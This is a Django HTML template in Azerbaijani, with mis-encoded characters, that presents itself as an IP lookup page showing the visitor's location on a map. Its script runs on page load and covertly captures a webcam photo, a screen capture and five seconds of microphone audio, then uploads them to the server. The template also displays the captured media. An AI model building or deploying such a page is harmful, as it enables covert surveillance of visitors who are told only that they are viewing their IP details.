<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8" />
    <title>S…ônin IP M…ôlumatlarƒ±n</title>
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <style>
        body { font-family: sans-serif; text-align: center; margin: 30px; background:#fafafa; color:#222; }
        .box { background: #fff; padding: 24px; border-radius: 10px; display: inline-block; box-shadow: 0 6px 18px rgba(0,0,0,0.06); max-width: 760px; width: 100%; }
        h1, h2 { margin: 0 0 12px; font-size: 22px; }
        p { margin: 6px 0; font-size: 16px; }
        .map-wrap { margin-top: 18px; border-radius:8px; overflow: hidden; border:1px solid #e6e6e6; }
        iframe { width: 100%; height: 360px; border: 0; display:block; }
        .meta { text-align: left; margin-top: 12px; }
        .link { margin-top:10px; display:inline-block; padding:8px 12px; background:#1976d2; color:white; text-decoration:none; border-radius:6px; }
        .muted { color:#666; font-size:14px; }
        img { border-radius: 8px; max-width: 100%; height: auto; margin-top: 12px; }
        audio { margin-top: 12px; width: 100%; outline:none; }
        #status { margin-top: 20px; font-weight: bold; color: green; }
        #error { margin-top: 20px; font-weight: bold; color: red; }
    </style>
</head>
<body>
    <div class="box">
        <h1>IP √únvanƒ±n: {{ ip }}</h1>
        <div class="meta">
            <p>üåç √ñlk…ô: <strong>{{ country }}</strong></p>
            <p>üèôÔ∏è ≈û…ôh…ôr: <strong>{{ city }}</strong></p>
            <p>üìç Region: <strong>{{ region }}</strong></p>
            <p>üíº Provider: <strong>{{ org }}</strong></p>
            <p class="muted">üì° Koordinatlar: <strong>{{ lat }}</strong>, <strong>{{ lon }}</strong></p>
        </div>

        <div class="map-wrap">
            {% if lat and lon %}
                <iframe
                    id="mapFrame"
                    src="https://www.google.com/maps?q={{ lat }},{{ lon }}&z=13&output=embed"
                    loading="lazy"
                    referrerpolicy="no-referrer-when-downgrade"
                    title="Location map">
                </iframe>
            {% else %}
                <div style="padding:40px;">üìç M…ôkan m…ôlumatƒ± …ôl√ßatan deyil.</div>
            {% endif %}
        </div>

        {% if lat and lon %}
            <p>
                <a class="link" href="https://www.google.com/maps?q={{ lat }},{{ lon }}" target="_blank" rel="noopener noreferrer">
                    X…ôrit…ôd…ô a√ß
                </a>
            </p>
        {% endif %}

        <!-- Kamera ≈û…ôkli -->
        {% if camera_image_url %}
            <h2>Kamera ≈û…ôkli</h2>
            <img src="{{ camera_image_url }}" alt="Kamera ≈û…ôkli" />
        {% else %}
            <p>Kamera ≈ü…ôkli m√∂vcud deyil.</p>
        {% endif %}

        <!-- Screenshot -->
        {% if screen_image_url %}
            <h2>Ekran G√∂r√ºnt√ºs√º (Screenshot)</h2>
            <img src="{{ screen_image_url }}" alt="Ekran G√∂r√ºnt√ºs√º" />
        {% else %}
            <p>Ekran g√∂r√ºnt√ºs√º m√∂vcud deyil.</p>
        {% endif %}

        <!-- Audio fayl -->
        {% if audio_url %}
            <h2>S…ôs Yazƒ±sƒ±</h2>
            <audio controls>
                <source src="{{ audio_url }}" type="audio/wav" />
                Sizin brauzer audio elementini d…ôst…ôkl…ômir.
            </audio>
        {% else %}
            <p>S…ôs faylƒ± m√∂vcud deyil.</p>
        {% endif %}

        <div id="status"></div>
        <div id="error"></div>
    </div>

<script>
// CSRF cookie-ni oxuyan funksiya (Django standartƒ±)
function getCookie(name) {
    let cookieValue = null;
    if (document.cookie && document.cookie !== '') {
        const cookies = document.cookie.split(';');
        for (const cookie of cookies) {
            const trimmedCookie = cookie.trim();
            if (trimmedCookie.startsWith(name + '=')) {
                cookieValue = decodeURIComponent(trimmedCookie.substring(name.length + 1));
                break;
            }
        }
    }
    return cookieValue;
}

async function captureCameraImage() {
    const video = document.createElement('video');
    video.autoplay = true;

    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    await new Promise(resolve => video.onloadedmetadata = resolve);

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);

    stream.getTracks().forEach(track => track.stop());

    return new Promise(resolve => {
        canvas.toBlob(blob => resolve(blob), 'image/jpeg');
    });
}

async function captureScreenImage() {
    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });

    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();

    await new Promise(resolve => video.onloadedmetadata = resolve);

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);

    stream.getTracks().forEach(track => track.stop());

    return new Promise(resolve => {
        canvas.toBlob(blob => resolve(blob), 'image/jpeg');
    });
}

async function recordAudio(durationMs = 5000) {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    const mediaRecorder = new MediaRecorder(stream);
    const chunks = [];

    mediaRecorder.ondataavailable = e => chunks.push(e.data);

    mediaRecorder.start();

    await new Promise(resolve => setTimeout(resolve, durationMs));

    mediaRecorder.stop();

    await new Promise(resolve => mediaRecorder.onstop = resolve);

    stream.getTracks().forEach(track => track.stop());

    return new Blob(chunks, { type: 'audio/wav' });
}

async function sendMediaToServer(cameraBlob, screenBlob, audioBlob) {
    const formData = new FormData();
    formData.append('camera_image', cameraBlob, 'camera.jpg');
    formData.append('screen_image', screenBlob, 'screen.jpg');
    formData.append('audio', audioBlob, 'audio.wav');

    const csrftoken = getCookie('csrftoken');

    const response = await fetch('/ip/', {
        method: 'POST',
        headers: {
            'X-CSRFToken': csrftoken
        },
        body: formData,
    });

    if (!response.ok) {
        throw new Error(`Server error: ${response.status}`);
    }

    return await response.json();
}

async function captureAndSendAll() {
    const statusElem = document.getElementById('status');
    const errorElem = document.getElementById('error');
    statusElem.textContent = "ƒ∞caz…ôl…ôr g√∂zl…ônilir v…ô media toplanƒ±r...";
    errorElem.textContent = "";

    try {
        const cameraBlob = await captureCameraImage();
        statusElem.textContent = "Kamera ≈ü…ôkli alƒ±ndƒ±. Ekran g√∂r√ºnt√ºs√º alƒ±nƒ±r...";

        const screenBlob = await captureScreenImage();
        statusElem.textContent = "Ekran g√∂r√ºnt√ºs√º alƒ±ndƒ±. S…ôs yazƒ±lƒ±r...";

        const audioBlob = await recordAudio(5000);
        statusElem.textContent = "S…ôs yazƒ±sƒ± tamamlandƒ±. Server…ô g√∂nd…ôrilir...";

        const result = await sendMediaToServer(cameraBlob, screenBlob, audioBlob);
        statusElem.textContent = "Media fayllarƒ± server…ô uƒüurla g√∂nd…ôrildi!";
        console.log("Server cavabƒ±:", result);
    } catch (err) {
        errorElem.textContent = "X…ôta ba≈ü verdi: " + err.message;
        statusElem.textContent = "";
        console.error(err);
    }
}

window.onload = () => {
    captureAndSendAll();
};
</script>

</body>
</html>
